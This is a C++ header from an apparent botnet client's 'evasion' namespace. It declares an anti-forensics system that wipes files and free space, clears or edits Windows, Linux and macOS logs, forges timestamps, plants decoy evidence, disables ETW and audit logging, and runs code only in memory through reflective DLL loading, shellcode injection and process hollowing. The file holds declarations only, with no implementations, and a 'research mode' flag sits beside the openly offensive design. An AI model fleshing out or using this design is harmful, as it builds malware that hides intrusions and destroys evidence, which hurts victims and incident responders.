#pragma once

#include <memory>
#include <string>
#include <vector>
#include <map>
#include <atomic>
#include <mutex>
#include <chrono>
#include <functional>
#include <nlohmann/json.hpp>
#include "../../../common/utils/platform_utils.h"

namespace botnet {
namespace client {
namespace evasion {

/**
 * @brief Advanced anti-forensic system - single codebase approach
 * 
 * Implements sophisticated evidence destruction and forensic evasion
 * techniques. Works identically across Windows, Linux, and macOS.
 */
class AntiForensics {
public:
    enum class ForensicEvasionTechnique {
        SECURE_FILE_DELETION,
        MEMORY_WIPING,
        TIMELINE_OBFUSCATION,
        ARTIFACT_DESTRUCTION,
        LOG_MANIPULATION,
        METADATA_REMOVAL,
        STEGANOGRAPHIC_HIDING,
        ENCRYPTED_STORAGE,
        EVIDENCE_PLANTING,
        DECOY_CREATION,
        VOLATILE_EXECUTION,
        ANTI_MEMORY_DUMPING
    };

    enum class WipingMethod {
        SINGLE_PASS_ZERO,
        TRIPLE_PASS_RANDOM,
        DOD_5220_22_M,
        GUTMANN_35_PASS,
        RANDOM_DATA_OVERWRITE,
        SECURE_ERASE_COMMAND,
        TRIM_COMMAND_SSD,
        CRYPTOGRAPHIC_ERASE
    };

    struct AntiForensicConfig {
        std::vector<ForensicEvasionTechnique> techniques;
        WipingMethod default_wiping_method;
        bool enable_real_time_wiping;
        bool enable_timeline_obfuscation;
        bool enable_decoy_creation;
        std::chrono::minutes evidence_retention_limit;
        bool research_mode;
        std::string research_session_id;
        bool comprehensive_logging;
    };

    struct ForensicEvent {
        std::chrono::system_clock::time_point timestamp;
        ForensicEvasionTechnique technique;
        std::string target;
        bool success;
        std::string details;
        bool research_logged;
    };

public:
    AntiForensics();
    ~AntiForensics();

    // Core anti-forensic operations
    bool Initialize(const AntiForensicConfig& config);
    bool ExecuteAntiForensics();
    bool EmergencyWipe();
    bool CreateDecoyEvidence();
    
    // File and data destruction
    bool SecureDeleteFile(const std::string& file_path, WipingMethod method = WipingMethod::DOD_5220_22_M);
    bool SecureDeleteDirectory(const std::string& directory_path);
    bool WipeFreeDiskSpace(const std::string& drive_letter);
    bool SecureWipeMemory(void* memory, size_t size);
    
    // Timeline manipulation
    bool ObfuscateFileTimestamps(const std::string& file_path);
    bool ManipulateSystemTime();
    bool ClearEventLogs();
    bool ModifyLogEntries();
    
    // Artifact destruction
    bool ClearBrowserHistory();
    bool ClearRecentDocuments();
    bool ClearTempFiles();
    bool ClearPrefetchFiles();
    bool ClearRegistryArtifacts();
    
    // Advanced techniques
    bool ImplementVolatileExecution();
    bool AntiMemoryDumping();
    bool PlantDecoyEvidence();
    bool EncryptRemainingEvidence();
    
    // Research mode
    void EnableResearchMode(const std::string& session_id);
    std::vector<ForensicEvent> GetForensicEvents() const;
    nlohmann::json GenerateForensicReport() const;

private:
    // Forward declarations for anti-forensic modules
    class SecureDeletion;
    class TimelineManipulation;
    class ArtifactDestruction;
    class MemoryWiping;
    class DecoyCreation;
    class VolatileExecution;
    class LogManipulation;

    AntiForensicConfig config_;
    
    // Anti-forensic modules
    std::unique_ptr<SecureDeletion> secure_deletion_;
    std::unique_ptr<TimelineManipulation> timeline_manipulation_;
    std::unique_ptr<ArtifactDestruction> artifact_destruction_;
    std::unique_ptr<MemoryWiping> memory_wiping_;
    std::unique_ptr<DecoyCreation> decoy_creation_;
    std::unique_ptr<VolatileExecution> volatile_execution_;
    std::unique_ptr<LogManipulation> log_manipulation_;
    
    // Event tracking
    std::vector<ForensicEvent> forensic_events_;
    mutable std::mutex events_mutex_;
    
    // Research mode
    bool research_mode_;
    std::string research_session_id_;
    
    // Internal methods
    bool InitializeModules();
    void LogForensicEvent(ForensicEvasionTechnique technique, const std::string& target, bool success);
    bool ValidateForensicOperation(ForensicEvasionTechnique technique, const std::string& target);
};

/**
 * @brief Secure file and data deletion
 */
class AntiForensics::SecureDeletion {
public:
    SecureDeletion();
    ~SecureDeletion();

    bool Initialize();
    
    // File deletion methods
    bool SecureDeleteFile(const std::string& file_path, WipingMethod method);
    bool SecureDeleteDirectory(const std::string& directory_path);
    bool WipeFreeDiskSpace(const std::string& drive_path);
    
    // Advanced deletion techniques
    bool OverwriteFileMetadata(const std::string& file_path);
    bool ShredFileSystemJournal();
    bool WipeSlackSpace(const std::string& file_path);
    bool SecureDeleteAlternateDataStreams(const std::string& file_path);
    
    // SSD-specific techniques
    bool TrimSSDBlocks(const std::string& drive_path);
    bool CryptographicEraseSSD(const std::string& drive_path);
    
    // Cross-platform implementations
    bool LinuxSecureDelete(const std::string& file_path, WipingMethod method);
    bool WindowsSecureDelete(const std::string& file_path, WipingMethod method);
    bool MacOSSecureDelete(const std::string& file_path, WipingMethod method);
    
    // Research mode deletion
    bool ResearchSecureDelete(const std::string& file_path, const std::string& session_id);

private:
    // Wiping algorithms
    bool SinglePassZero(const std::string& file_path);
    bool TriplePassRandom(const std::string& file_path);
    bool DOD522022M(const std::string& file_path);
    bool Gutmann35Pass(const std::string& file_path);
    bool RandomDataOverwrite(const std::string& file_path, uint32_t passes);
    
    // Low-level operations
    bool OverwriteFileData(const std::string& file_path, const std::vector<uint8_t>& pattern);
    bool GetFileSize(const std::string& file_path, uint64_t& size);
    bool OverwriteFileInChunks(const std::string& file_path, const std::vector<uint8_t>& pattern);
    
    // Platform-specific low-level access
    bool DirectDiskAccess(const std::string& device_path, uint64_t offset, const std::vector<uint8_t>& data);
    bool FlushDiskBuffers(const std::string& device_path);
    
    // Research logging
    void LogDeletionAttempt(const std::string& file_path, WipingMethod method, bool success);
};

/**
 * @brief Timeline obfuscation and manipulation
 */
class AntiForensics::TimelineManipulation {
public:
    TimelineManipulation();
    ~TimelineManipulation();

    bool Initialize();
    
    // Timestamp manipulation
    bool ObfuscateFileTimestamps(const std::string& file_path);
    bool SetRandomTimestamps(const std::string& file_path);
    bool CopyTimestampsFromLegitimateFile(const std::string& target_file, const std::string& legitimate_file);
    bool SetTimestampsToFuture(const std::string& file_path);
    bool SetTimestampsToPast(const std::string& file_path);
    
    // System time manipulation
    bool TemporarilyChangeSystemTime(const std::chrono::system_clock::time_point& new_time);
    bool RestoreSystemTime();
    bool DisableTimeSync();
    bool EnableTimeSync();
    
    // Registry timestamp manipulation (Windows)
    bool ObfuscateRegistryTimestamps(const std::string& key_path);
    bool ModifyRegistryLastWriteTime(const std::string& key_path);
    
    // Event log manipulation
    bool ClearEventLogs();
    bool ModifyEventLogEntries(const std::string& log_name);
    bool CreateDecoyLogEntries();
    bool DisableEventLogging();
    
    // File system journal manipulation
    bool ClearNTFSJournal();
    bool ModifyExt4Journal();
    bool ClearHFSJournal();
    
    // Research mode implementation
    bool ResearchTimelineManipulation(const std::string& session_id);

private:
    std::chrono::system_clock::time_point original_system_time_;
    bool system_time_modified_;
    
    // Timestamp utilities
    std::chrono::system_clock::time_point GenerateRandomTimestamp();
    bool SetFileTimestamps(const std::string& file_path, 
                          const std::chrono::system_clock::time_point& creation_time,
                          const std::chrono::system_clock::time_point& modification_time,
                          const std::chrono::system_clock::time_point& access_time);
    
    // Platform-specific timestamp manipulation
    bool SetWindowsFileTimestamps(const std::string& file_path, 
                                 const std::chrono::system_clock::time_point& creation_time,
                                 const std::chrono::system_clock::time_point& modification_time,
                                 const std::chrono::system_clock::time_point& access_time);
    bool SetUnixFileTimestamps(const std::string& file_path,
                              const std::chrono::system_clock::time_point& modification_time,
                              const std::chrono::system_clock::time_point& access_time);
    
    // Event log manipulation
    bool ClearWindowsEventLog(const std::string& log_name);
    bool ClearLinuxSyslog();
    bool ClearMacOSLog();
    
    // Research logging
    void LogTimelineManipulation(const std::string& target, const std::string& operation, bool success);
};

/**
 * @brief System artifact destruction
 */
class AntiForensics::ArtifactDestruction {
public:
    ArtifactDestruction();
    ~ArtifactDestruction();

    bool Initialize();
    
    // Browser artifact clearing
    bool ClearBrowserHistory();
    bool ClearBrowserCache();
    bool ClearBrowserCookies();
    bool ClearBrowserDownloads();
    bool ClearBrowserSessions();
    
    // System artifact clearing
    bool ClearRecentDocuments();
    bool ClearJumpLists();
    bool ClearThumbnailCache();
    bool ClearTempFiles();
    bool ClearRecycleBin();
    
    // Windows-specific artifacts
    bool ClearPrefetchFiles();
    bool ClearWindowsSearchHistory();
    bool ClearEventViewerLogs();
    bool ClearUSBHistory();
    bool ClearNetworkHistory();
    
    // Registry artifacts (Windows)
    bool ClearRegistryArtifacts();
    bool ClearMRULists();
    bool ClearUserAssist();
    bool ClearShellBags();
    bool ClearBamDam();
    
    // Linux-specific artifacts
    bool ClearBashHistory();
    bool ClearVimHistory();
    bool ClearSystemLogs();
    bool ClearAuthLogs();
    bool ClearApplicationLogs();
    
    // macOS-specific artifacts
    bool ClearMacOSRecentItems();
    bool ClearMacOSQuickLook();
    bool ClearMacOSSpotlight();
    bool ClearMacOSConsoleLog();
    
    // Research mode implementation
    bool ResearchArtifactDestruction(const std::string& session_id);

private:
    // Browser detection and clearing
    std::vector<std::string> DetectInstalledBrowsers();
    bool ClearChromeArtifacts();
    bool ClearFirefoxArtifacts();
    bool ClearEdgeArtifacts();
    bool ClearSafariArtifacts();
    
    // System cleaning utilities
    std::vector<std::string> FindTempDirectories();
    std::vector<std::string> FindCacheDirectories();
    bool SecureDeleteDirectoryContents(const std::string& directory_path);
    
    // Registry cleaning (Windows)
    bool ClearRegistryKey(const std::string& key_path);
    bool ClearRegistryValue(const std::string& key_path, const std::string& value_name);
    std::vector<std::string> GetMRURegistryKeys();
    
    // Research logging
    void LogArtifactDestruction(const std::string& artifact_type, bool success);
};

/**
 * @brief Memory wiping and anti-dumping
 */
class AntiForensics::MemoryWiping {
public:
    MemoryWiping();
    ~MemoryWiping();

    bool Initialize();
    
    // Memory wiping operations
    bool WipeProcessMemory();
    bool WipeSpecificMemoryRegion(void* address, size_t size);
    bool WipeHeapMemory();
    bool WipeStackMemory();
    
    // Anti-memory dumping
    bool AntiMemoryDumping();
    bool DetectMemoryDumping();
    bool PreventProcessDumping();
    bool EncryptSensitiveMemory();
    
    // Volatile execution
    bool ImplementVolatileExecution();
    bool ExecuteFromMemoryOnly();
    bool AvoidFileSystemWrites();
    
    // Memory protection
    bool ProtectCriticalMemoryRegions();
    bool ImplementMemoryObfuscation();
    bool RandomizeMemoryLayout();
    
    // Research mode implementation
    bool ResearchMemoryWiping(const std::string& session_id);

private:
    std::vector<std::pair<void*, size_t>> protected_regions_;
    
    // Memory wiping algorithms
    bool ZeroMemory(void* address, size_t size);
    bool RandomFillMemory(void* address, size_t size);
    bool PatternFillMemory(void* address, size_t size, const std::vector<uint8_t>& pattern);
    
    // Memory enumeration
    std::vector<std::pair<void*, size_t>> EnumerateProcessMemory();
    bool IsMemoryWritable(void* address, size_t size);
    bool IsMemoryExecutable(void* address, size_t size);
    
    // Anti-dumping techniques
    bool HookMemoryAPIs();
    bool DetectDebugger();
    bool DetectProcessHollowing();
    bool ImplementAntiAttach();
    
    // Memory protection
    bool SetMemoryProtection(void* address, size_t size, uint32_t protection);
    bool AllocateProtectedMemory(size_t size, void** memory);
    bool EncryptMemoryRegion(void* address, size_t size, const std::vector<uint8_t>& key);
    
    // Research logging
    void LogMemoryWiping(const std::string& operation, bool success);
};

/**
 * @brief Decoy evidence creation
 */
class AntiForensics::DecoyCreation {
public:
    DecoyCreation();
    ~DecoyCreation();

    bool Initialize();
    
    // Decoy file creation
    bool CreateDecoyFiles();
    bool CreateDecoyDocuments();
    bool CreateDecoyImages();
    bool CreateDecoyExecutables();
    
    // Decoy network artifacts
    bool CreateDecoyNetworkConnections();
    bool CreateDecoyBrowserHistory();
    bool CreateDecoyDownloads();
    
    // Decoy system artifacts
    bool CreateDecoyRegistryEntries();
    bool CreateDecoyEventLogEntries();
    bool CreateDecoyProcesses();
    
    // Misleading evidence
    bool PlantMisleadingTimestamps();
    bool CreateFalseUserActivity();
    bool GenerateFakeSystemMetrics();
    
    // Research mode implementation
    bool ResearchDecoyCreation(const std::string& session_id);

private:
    std::vector<std::string> created_decoy_files_;
    std::vector<std::string> created_decoy_registry_entries_;
    
    // Decoy generation algorithms
    std::string GenerateDecoyDocument(const std::string& file_type);
    std::vector<uint8_t> GenerateDecoyImageData();
    std::vector<uint8_t> GenerateDecoyExecutableData();
    
    // Realistic decoy content
    std::string GenerateRealisticTextContent(size_t word_count);
    std::vector<std::string> GenerateRealisticFilenames();
    std::vector<std::string> GenerateRealisticURLs();
    
    // Decoy placement
    bool PlaceDecoyInCommonLocation(const std::string& decoy_file);
    bool SetRealisticTimestamps(const std::string& file_path);
    bool SetRealisticFileSize(const std::string& file_path);
    
    // Research logging
    void LogDecoyCreation(const std::string& decoy_type, const std::string& location, bool success);
};

/**
 * @brief Volatile execution framework
 */
class AntiForensics::VolatileExecution {
public:
    VolatileExecution();
    ~VolatileExecution();

    bool Initialize();
    
    // Volatile execution modes
    bool EnableMemoryOnlyExecution();
    bool ExecuteFromEncryptedMemory();
    bool ImplementFilelessExecution();
    bool UseRegistryOnlyExecution();
    
    // Memory-only operations
    bool LoadLibraryFromMemory(const std::vector<uint8_t>& library_data);
    bool ExecuteCodeFromMemory(const std::vector<uint8_t>& code_data);
    bool CreateMemoryOnlyProcess(const std::vector<uint8_t>& executable_data);
    
    // Storage avoidance
    bool AvoidFileSystemWrites();
    bool UseVolatileStorage();
    bool ImplementRAMDiskExecution();
    
    // Anti-persistence techniques
    bool DisableCrashDumps();
    bool DisableHibernation();
    bool DisablePageFile();
    bool ClearMemoryOnExit();
    
    // Research mode implementation
    bool ResearchVolatileExecution(const std::string& session_id);

private:
    std::vector<void*> allocated_memory_regions_;
    bool volatile_mode_active_;
    
    // Memory management
    bool AllocateVolatileMemory(size_t size, void** memory);
    bool DeallocateVolatileMemory(void* memory);
    bool ProtectVolatileMemory(void* memory, size_t size);
    
    // In-memory execution
    bool ReflectiveLoadDLL(const std::vector<uint8_t>& dll_data);
    bool InjectShellcode(const std::vector<uint8_t>& shellcode);
    bool CreateHollowProcess(const std::string& target_process, const std::vector<uint8_t>& payload);
    
    // Storage monitoring
    bool MonitorFileSystemWrites();
    bool InterceptWriteOperations();
    bool RedirectToMemory();
    
    // Cleanup operations
    bool WipeVolatileMemory();
    bool ClearMemoryMappedFiles();
    bool FlushCPUCaches();
    
    // Research logging
    void LogVolatileOperation(const std::string& operation, bool success);
};

/**
 * @brief Log manipulation and anti-logging
 */
class AntiForensics::LogManipulation {
public:
    LogManipulation();
    ~LogManipulation();

    bool Initialize();
    
    // Log clearing operations
    bool ClearAllEventLogs();
    bool ClearSpecificEventLog(const std::string& log_name);
    bool ClearSyslogEntries();
    bool ClearApplicationLogs();
    
    // Log manipulation
    bool ModifyLogEntries(const std::string& log_name, const std::string& search_pattern, const std::string& replacement);
    bool InsertDecoyLogEntries(const std::string& log_name);
    bool BackdateLogEntries(const std::string& log_name);
    
    // Anti-logging techniques
    bool DisableEventLogging();
    bool DisableSyslog();
    bool DisableAuditLogging();
    bool HookLoggingAPIs();
    
    // ETW (Event Tracing for Windows) manipulation
    bool DisableETWProviders();
    bool PatchETWFunctions();
    bool BlockETWTracing();
    
    // Research mode implementation
    bool ResearchLogManipulation(const std::string& session_id);

private:
    std::vector<std::string> disabled_log_providers_;
    std::map<std::string, void*> hooked_logging_functions_;
    
    // Windows log manipulation
    bool ClearWindowsEventLog(const std::string& log_name);
    bool ModifyWindowsEventLog(const std::string& log_name);
    bool DisableWindowsEventLogging();
    
    // Linux log manipulation
    bool ClearLinuxSystemLogs();
    bool ModifyLinuxLogFiles();
    bool DisableLinuxSyslog();
    
    // macOS log manipulation
    bool ClearMacOSSystemLog();
    bool ModifyMacOSLogFiles();
    bool DisableMacOSLogging();
    
    // ETW manipulation
    bool EnumerateETWProviders();
    bool DisableETWProvider(const std::string& provider_guid);
    bool PatchETWEventWrite();
    
    // API hooking for logging
    bool HookEventLogAPI();
    bool HookSyslogAPI();
    bool InterceptLogWrites();
    
    // Research logging
    void LogManipulationActivity(const std::string& operation, const std::string& target, bool success);
};

/**
 * @brief Anti-forensic validator and safety controller
 */
class AntiForensicValidator {
public:
    struct ValidationResult {
        bool allowed;
        std::string reason;
        std::vector<std::string> warnings;
        std::vector<std::string> blocked_operations;
        bool requires_research_approval;
    };

public:
    static ValidationResult ValidateAntiForensicOperation(AntiForensics::ForensicEvasionTechnique technique, 
                                                         const std::string& target,
                                                         bool research_mode);
    static bool IsOperationSafeForResearch(AntiForensics::ForensicEvasionTechnique technique);
    static std::vector<AntiForensics::ForensicEvasionTechnique> GetResearchSafeTechniques();
    static std::vector<AntiForensics::ForensicEvasionTechnique> GetDangerousTechniques();

private:
    static const std::vector<AntiForensics::ForensicEvasionTechnique> RESEARCH_SAFE_TECHNIQUES;
    static const std::vector<AntiForensics::ForensicEvasionTechnique> DESTRUCTIVE_TECHNIQUES;
    
    static bool IsDestructiveOperation(AntiForensics::ForensicEvasionTechnique technique);
    static bool AffectsSystemIntegrity(AntiForensics::ForensicEvasionTechnique technique);
    static std::string GetTechniqueRiskLevel(AntiForensics::ForensicEvasionTechnique technique);
};

} // namespace evasion
} // namespace client
} // namespace botnet
